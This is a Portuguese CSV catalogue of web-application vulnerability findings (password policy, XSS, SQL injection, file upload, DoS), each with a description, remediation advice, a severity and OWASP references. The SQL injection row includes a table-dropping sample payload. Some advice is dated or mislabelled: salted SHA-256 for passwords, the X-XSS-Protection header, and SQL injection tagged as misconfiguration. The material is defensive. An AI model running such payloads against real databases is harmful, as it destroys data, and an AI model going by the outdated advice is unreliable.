;Data Source Type;Data Source Key;Vulnerabilidade;Descrição;Outras observações técnicas;Recomendação - Título;Recomendação;Causa raíz;CAT1 - CONTROLE;CAT2 - OWASP;Severidade;Risco (Tags);Referência 1;Referência 2;;;;;;;;;;;;;;
V;;;Política de senhas fraca;"Uma senha, ou password, serve para autenticar uma conta, ou seja, é usada no processo de verificação da sua identidade, assegurando que você é realmente quem diz ser e que possui o direito de acessar o recurso em questão. A política de senhas atual é fraca, permitindo a fácil identificação de password de acesso por um usuário mal-intencionado, por meio de ataques de força bruta ou dicionário.";-;Política de senhas fraca;"Definir uma política de senha forte, onde recomenda-se seguir os seguintes requisitos:•	Contenha no mínimo 8 caracteres ou mais;•	Inclua números, símbolos, letras maiúsculas e minúsculas;•	Efetuar a troca periódicas das senhas, recomendado de 90 em 90 dias.NÃO permitir o uso de:•	Senha de fácil dedução (ex: carro2018, jose123, password, pass123, p@55w0rd, P@ssw0rd123);•	Senhas compostas somente com números (ex:12345678);•	Informações pessoais na composição da password (ex: idade e nome, joao1985);•	Senhas antigas;•	Nome do usuário na composição da senha;•	Senhas compostas com Informações relacionadas a empresa (empresa123, empresa2019).Conscientizar os usuários com as seguintes práticas:•	NÃO salvar senhas nos browsers, utilizar um gerenciador de senhas seguro;•	NÃO utilizar e-mail corporativo em sites de terceiros (ex: Linkedin, Facebook, lojas, etc;•	NÃO compartilhar senhas.Práticas seguras: •	Após a criação do usuário/senha o mesmo deve ser enviado para o respectivo responsável, via comunicação segura, se possível sem interação humana; •	Utilize um mecanismo de segundo fator de autenticação (2FA) em todos os sistemas que possuem essa funcionalidade;.";Senha;Política de senhas;;MEDIUM;;;;;;;;;;;;;;;;;
V;;;Inexistência de função para alteração da senha;"O sistema deve fornecer, na área autenticada, um componente para a troca de senha do usuário.Sendo assim, caso o usuário queira apenas alterar a senha, é necessário solicitar a senha atual e a nova senha duas vezes, então devem haver três campos (senha atual, senha nova e repetir senha nova) para a alteração de senha. Caso os campos de senha nova não sejam iguais, o usuário deve ser informado que a senha não foi alterada pois as senhas não coincidem. Caso a senha atual não coincida realmente com a senha atual, o usuário deve ser informado que a senha está incorreta.";-;Inexistência de função para alteração da senha;"O sistema deve fornecer, na área autenticada, um componente para a troca de senha do usuário.Sendo assim, caso o usuário queira apenas alterar a senha, é necessário solicitar a senha atual e a nova senha duas vezes, então devem haver três campos (senha atual, senha nova e repetir senha nova) para a alteração de senha. Caso os campos de senha nova não sejam iguais, o usuário deve ser informado que a senha não foi alterada pois as senhas não coincidem. Caso a senha atual não coincida realmente com a senha atual, o usuário deve ser informado que a senha está incorreta.";Senha;Alteração de senha;;MEDIUM;;;;;;;;;;;;;;;;;
V;;;Inexistência de função para recuperação da senha;"Ao solicitar a recuperação de senha, o sistema nunca deverá enviar a senha em texto claro ao usuário.O sistema também não deverá gerar uma senha para o usuário.A funcionalidade de recuperação de senha deve ter as seguintes características:_ Enviar ao e-mail do usuário uma URL com um token alfanumérico gerado de forma aleatória que contém pelo menos 25 caracteres;_ Ser de uso único, ou seja, não permitir a reutilização deste token;_ Possuir tempo limitado de acesso, sendo assim, este token deve expirar e se tornar inválido após algumas horas caso não seja utilizado;_ Após o usuário criar uma senha, um novo e-mail deve ser enviado ao usuário, informando-o que a senha foi alterada com sucesso;_ Caso seja solicitada a recuperação de senha mais de uma vez para o mesmo usuário, somente o token da última recuperação solicitada deve permanecer válido, sendo assim, deve haver apenas um token válido por usuário, os outros devem ser imediatamente expirados e invalidados._ A senha esquecida do usuário só deve ser invalidada caso o usuário execute por completo o procedimento de nova senha.Enviar a senha em texto claro do usuário ao usuário indica que a senha está armazenada de forma incorreta, esta deve ser armazenada apenas o hash do valor gerado, além disso, caso seja gerada uma senha nova pela aplicação, alguns problemas podem aparecer:_ A geração de senha pode ser previsível;_ A senha pode ser capturada caso a caixa do usuário seja comprometida.OBS: A aplicação pode gerar a senha para o usuário, caso o mesmo seja criado de forma randômica e para cada acesso solicitado pelo usuário.";-;Inexistência de função para recuperação da senha;"Ao solicitar a recuperação de senha, o sistema nunca deverá enviar a senha em texto claro ao usuário.O sistema também não deverá gerar uma senha para o usuário.A funcionalidade de recuperação de senha deve ter as seguintes características:_ Enviar ao e-mail do usuário uma URL com um token alfanumérico gerado de forma aleatória que contém pelo menos 25 caracteres;_ Ser de uso único, ou seja, não permitir a reutilização deste token;_ Possuir tempo limitado de acesso, sendo assim, este token deve expirar e se tornar inválido após algumas horas caso não seja utilizado;_ Após o usuário criar uma senha, um novo e-mail deve ser enviado ao usuário, informando-o que a senha foi alterada com sucesso;_ Caso seja solicitada a recuperação de senha mais de uma vez para o mesmo usuário, somente o token da última recuperação solicitada deve permanecer válido, sendo assim, deve haver apenas um token válido por usuário, os outros devem ser imediatamente expirados e invalidados._ A senha esquecida do usuário só deve ser invalidada caso o usuário execute por completo o procedimento de nova senha.Enviar a senha em texto claro do usuário ao usuário indica que a senha está armazenada de forma incorreta, esta deve ser armazenada apenas o hash do valor gerado, além disso, caso seja gerada uma senha nova pela aplicação, alguns problemas podem aparecer:_ A geração de senha pode ser previsível;_ A senha pode ser capturada caso a caixa do usuário seja comprometida.OBS: A aplicação pode gerar a senha para o usuário, caso o mesmo seja criado de forma randômica e para cada acesso solicitado pelo usuário.";Senha;Recuperação da senha;;MEDIUM;;;;;;;;;;;;;;;;;
V;;;Armazenamento inseguro de senha;"Para armazenamento de senhas na base de dados, é recomendável utilizar algoritmos de hash (SHA-256 ou superior) com a função de SALT, de maneira a dificultar a identificação de senhas caso haja um vazamento ou exposição de base de dados.Em caso de vazamento de dado ou exposição da base, armazenar a senha de maneira correta, com um algoritmo de hash aplicado ao dado, garante que o usuário não tenha sua credencial exposta diretamente, além disso, utilizar o salt dificulta de maneira relevante a identificação da senha do usuário por meio de comparação de hashes. ";-;Armazenamento inseguro de senha;"Para armazenamento de senhas na base de dados, é recomendável utilizar algoritmos de hash (SHA-256 ou superior) com a função de SALT, de maneira a dificultar a identificação de senhas caso haja um vazamento ou exposição de base de dados.Em caso de vazamento de dado ou exposição da base, armazenar a senha de maneira correta, com um algoritmo de hash aplicado ao dado, garante que o usuário não tenha sua credencial exposta diretamente, além disso, utilizar o salt dificulta de maneira relevante a identificação da senha do usuário por meio de comparação de hashes. ";Senha;Armazenamento de senha;;MEDIUM;;https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet;;;;;;;;;;;;;;;
V;;;Cross-Site Scripting - DOM;"Os ataques de Cross-Site Scripting (XSS) são um tipo de injeção, na qual scripts maliciosos são injetados na aplicação de forma confiável. Um usuário mal-intencionado pode usar o XSS para enviar um script maliciosos a um usuário desavisado. O navegador do usuário não tem como saber se o script não é confiável e executa o script. As vulnerabilidades de cross-site scripting (XSS) ocorrem quando os dados são inseridos na aplicação por meio de uma fonte não confiável, onde podemos dividir em três tipos:•        XSS baseado em DOM, o conteúdo malicioso é executado como parte da criação do DOM (Document Object Model), sempre que o navegador da vítima analisa a página HTML;•        XSS refletido (Reflected), normalmente é uma manipulação de uma URL válida, que permite mudar a estrutura de uma página HTML e altera as informações no browser do cliente;•        XSS persistente (Stored/armazenado), conteúdo malicioso inserido no banco de dados, através da aplicação, devido a falta de validação das requisições enviadas pelo cliente, do lado do servidor, fazendo com que a cada usuário que acessar a página HTML válida da aplicação, carregue esses dados manipulados e execute um script com uma ação maliciosa. O conteúdo mal-intencionado enviado ao navegador da web geralmente assume a forma de um segmento de JavaScript, mas também pode incluir HTML, Flash ou qualquer outro tipo de código que o navegador executa. Impactos:•        Transmissão de dados privados do usuário, como cookies ou outras informações da sessão;•        Redirecionando da vítima para um ambiente controlado pelo usuário mal-intencionado;•        Realizar operações maliciosas na máquina do usuário;•        Distorção da aplicação vulnerável (Reescrever o conteúdo da página HTML).";-;Cross-Site Scripting - DOM;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;;;;;;;;;;;;;;;;
V;;;Cross-Site Scripting - Persistente;"Os ataques de Cross-Site Scripting (XSS) são um tipo de injeção, na qual scripts maliciosos são injetados na aplicação de forma confiável. Um usuário mal-intencionado pode usar o XSS para enviar um script maliciosos a um usuário desavisado. O navegador do usuário não tem como saber se o script não é confiável e executa o script. As vulnerabilidades de cross-site scripting (XSS) ocorrem quando os dados são inseridos na aplicação por meio de uma fonte não confiável, onde podemos dividir em três tipos:•	XSS baseado em DOM, o conteúdo malicioso é executado como parte da criação do DOM (Document Object Model), sempre que o navegador da vítima analisa a página HTML;•	XSS refletido (Reflected), normalmente é uma manipulação de uma URL válida, que permite mudar a estrutura de uma página HTML e altera as informações no browser do cliente;•	XSS persistente (Stored/armazenado), conteúdo malicioso inserido no banco de dados, através da aplicação, devido a falta de validação das requisições enviadas pelo cliente, do lado do servidor, fazendo com que a cada usuário que acessar a página HTML válida da aplicação, carregue esses dados manipulados e execute um script com uma ação maliciosa. O conteúdo mal-intencionado enviado ao navegador da web geralmente assume a forma de um segmento de JavaScript, mas também pode incluir HTML, Flash ou qualquer outro tipo de código que o navegador executa. Impactos:•	Transmissão de dados privados do usuário, como cookies ou outras informações da sessão;•	Redirecionando da vítima para um ambiente controlado pelo usuário mal-intencionado;•	Realizar operações maliciosas na máquina do usuário;•	Distorção da aplicação vulnerável (Reescrever o conteúdo da página HTML).";-;Cross-Site Scripting - Persistente;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;MEDIUM;;;;;;;;;;;;;;;;;
V;;;Cross-Site Scripting - Refletido;"Os ataques de Cross-Site Scripting (XSS) são um tipo de injeção, na qual scripts maliciosos são injetados na aplicação de forma confiável. Um usuário mal-intencionado pode usar o XSS para enviar um script maliciosos a um usuário desavisado. O navegador do usuário não tem como saber se o script não é confiável e executa o script. As vulnerabilidades de cross-site scripting (XSS) ocorrem quando os dados são inseridos na aplicação por meio de uma fonte não confiável, onde podemos dividir em três tipos:•        XSS baseado em DOM, o conteúdo malicioso é executado como parte da criação do DOM (Document Object Model), sempre que o navegador da vítima analisa a página HTML;•        XSS refletido (Reflected), normalmente é uma manipulação de uma URL válida, que permite mudar a estrutura de uma página HTML e altera as informações no browser do cliente;•        XSS persistente (Stored/armazenado), conteúdo malicioso inserido no banco de dados, através da aplicação, devido a falta de validação das requisições enviadas pelo cliente, do lado do servidor, fazendo com que a cada usuário que acessar a página HTML válida da aplicação, carregue esses dados manipulados e execute um script com uma ação maliciosa. O conteúdo mal-intencionado enviado ao navegador da web geralmente assume a forma de um segmento de JavaScript, mas também pode incluir HTML, Flash ou qualquer outro tipo de código que o navegador executa. Impactos:•        Transmissão de dados privados do usuário, como cookies ou outras informações da sessão;•        Redirecionando da vítima para um ambiente controlado pelo usuário mal-intencionado;•        Realizar operações maliciosas na máquina do usuário;•        Distorção da aplicação vulnerável (Reescrever o conteúdo da página HTML).";-;Cross-Site Scripting - Refletido;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;OWASP - A7 – Cross-site Scripting (XSS);Alto;;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS);https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md;;;;;;;;;;;;;;
V;;;Manipulação de Parâmetros;O ataque é baseado na possibilidade de alterar parâmetros da aplicação web entre cliente e servidor, com o objetivo de modificar dados como credenciais, IDs, permissões, preços, etc., sendo realizado por um usuário mal-intencionado com o intuito de tentar elevar privilégios de acesso, controle de acesso às áreas da aplicação e arquivos que o mesmo não possui acesso.;-;Manipulação de Parâmetros;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:        _        Campos de formulário;_        Conteúdo de URLs;_        Parâmetros de requisições GET e POST;_        Cabeçalhos HTTP;_        Nomes e valores de cookies;_        Redirecionamentos.Deve-se aplicar os seguintes controles:•        Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•        As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•        Criar uma White list ou black list, sendo:o        White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o        Black list: Lista com os caracteres que devem ser proibidos, como:_        > (maior)_        < (Menor)_        & (e comercial)_        ' (Apóstrofo ou aspas simples)_        """" (Aspas dupla)_        ( ) (Parênteses)_        % (Porcentagem)_        $ (Dólar)_        ~ (Til)_        \ (Barra invertida)_        / (barra)_        | (barra vertical)_        (Espaço em branco)_        ; (ponto e vírgula)_        .. (duplo ponto final)_        … (triplo ponto final)_        Bytes nulos (%00)_        Caracteres de novas linhas (%0d, %0a, \r, \n), _        Caso seja utilizado a extensão UTF-8, deve-se haver representações         alternativas como: %c0%ae%c0%ae/._        Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_        Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLsEm conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•        X-Frame-Options: SAMEORIGIN•        X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;MEDIUM;;;;;;;;;;;;;;;;;
V;;;Negação de Serviço por tempo de execução de parâmetro;A aplicação está suscetível a negação de serviço por meio do envio de requisições manipuladas através das variáveis da aplicação. Quando esta vulnerabilidade é explorada, a aplicação torna-se indisponível até que o serviço seja reiniciado.;-;Negação de Serviço por tempo de execução de parâmetro;"Deve-se realizar as seguintes ações:1. Avaliar qual o componente que ocasionou a interrupção do serviço, revisando as funções de dados e os parâmetros de entrada a fim de garantir o devido tratamento das informações submetidas pelo usuário;2. Devem ser redirecionadas para uma página de erro padrão;3. Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs4. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;;;;;;;;;;;;;;;;
V;;;Permissão excessiva para upload;Quando é permitido aos usuários a transferência de arquivos dos seus computadores para os servidores via uma aplicação Web, é de extrema importância que se faça as verificações necessárias para impedir o mau uso dessa funcionalidade:;-;Permissão excessiva para upload;"Deve-se aplicar os seguintes controles:- Não permitir a sobreposição de arquivos de configuração, códigos fontes, arquivos HTML ou imagens do sistema;- Impedir o envio dos arquivos que podem ser executados pelo servidor de aplicação, como JSP, PHP, CFM, ASPX ou ASP;- Definir um tamanho limite para o upload de arquivos e também restringir a quantidade limite de arquivos por usuário;- Validar o cabeçalho “Content-Type”;- Impedir a alteração do diretório destino;- Recomendável disponibilizar o destino do upload em uma partição separada do sistema e dos logs.•        Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•        As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•        Criar uma White list ou black list, sendo:o        White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o        Black list: Lista com os caracteres que devem ser proibidos, como:_        > (maior)_        < (Menor)_        & (e comercial)_        ' (Apóstrofo ou aspas simples)_        """" (Aspas dupla)_        ( ) (Parênteses)_        % (Porcentagem)_        $ (Dólar)_        ~ (Til)_        \ (Barra invertida)_        / (barra)_        | (barra vertical)_        (Espaço em branco)_        ; (ponto e vírgula)_        .. (duplo ponto final)_        … (triplo ponto final)_        Bytes nulos (%00)_        Caracteres de novas linhas (%0d, %0a, \r, \n), _        Caso seja utilizado a extensão UTF-8, deve-se haver representações         alternativas como: %c0%ae%c0%ae/._        Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_        Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•        X-Frame-Options: SAMEORIGIN•        X-XSS-Protection: 1; mode=block";Validação de dados;Upload seguro de arquivos ;;HIGH;;https://www.owasp.org/index.php/Unrestricted_File_Upload;;;;;;;;;;;;;;;
V;;;SQL Injection;"Este ataque consiste da inserção ou ""injeção"" de comandos SQL via entrada de dados da aplicação. Através destes comandos é possível ler os dados, inclusive dados sensíveis, no banco de dados, modificar dados (inserir, atualizar e apagar), executar operações administrativas (ex: apagar tabelas, reiniciar a base), recuperar conteúdos de arquivos existentes no banco de dados e em alguns casos executar comandos no sistema operacional.Caso os dados sejam concatenados da maneira incorreta, como por exemplo:var         query = “SELECT * FROM usuarios WHERE nome = ‘” +         dadoVindoDoUsuario + “’”;Em uma requisição de um usuário bem-intencionado, a chamada sairia da seguinte maneira:var query = SELECT * FROM usuarios WHERE nome = ‘joao’;Em uma requisição mal-intencionada, ao invés de “joao” o usuário enviaria “’;drop table usuarios;--” e a chamada se tornaria a seguinte:var         query = SELECT * FROM usuarios WHERE nome =’’;drop table         usuarios;--’;";-;SQL Injection;"Para que não ocorram injeções SQL bem-sucedidas, é preciso utilizar consultas parametrizadas no banco, tratando os dados inseridos na consulta como realmente um dado.A maioria dos bancos de dados e plataformas fornecem componentes para tratar entradas não confiáveis. Sendo que em uma pseudolinguagem, o tratamento se daria da seguinte maneira:var sql = “SELECT * FROM usuarios WHERE login = ? and senha = ?”;banco.setParametro(“login”, loginVindoDoUsuario);banco.setParametro(“senha”, senhaVindaDoUsuario);banco.executaConsulta(sql);";Validação de dados;Validação de instruções SQL;OWASP - A6 – Security Misconfiguration;Crítico;;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md;https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet;;;;;;;;;;;;;;
V;;;Validação de Entrada de Dados Inadequada;A aplicação não valida ou valida incorretamente a entrada de dados submetidos nos formulários, permitindo a um usuário mal-intenionado a manipulação de dados afim de causar comportamentos inesperados na aplicação.;-;Validação de Entrada de Dados Inadequada;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;http://www.owasp.org/index.php/Data_Validation;;;;;;;;;;;;;;;
